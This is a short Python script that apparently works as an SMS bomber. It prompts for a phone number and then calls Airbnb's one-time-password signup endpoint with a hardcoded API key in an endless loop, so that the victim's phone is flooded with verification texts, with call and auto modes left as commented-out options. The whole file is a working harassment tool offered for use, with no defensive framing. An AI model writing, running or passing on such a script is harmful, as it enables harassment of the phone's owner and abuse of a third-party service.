#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests

def airbnb(phone): #phone = 84943687522
	link = "https://www.airbnb.co.in/api/v2/phone_one_time_passwords?currency=VND&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=vi"
	data = {
		"phoneNumber":"",
		"workFlow":"GLOBAL_SIGNUP_LOGIN",
		"otpMethod":"AUTO"
		}
	data["phoneNumber"] = "84" + phone[1:]
	data["otpMethod"] = "TEXT"
	# data["otpMethod"] = "AUTO"
	# data["otpMethod"] = "CALL"
	res = requests.post(link, json = data)
	return(res, res.text)

phone = input(">_ Phone : ")
count = 0
while True:
	count = count + 1
	print(count,airbnb(phone))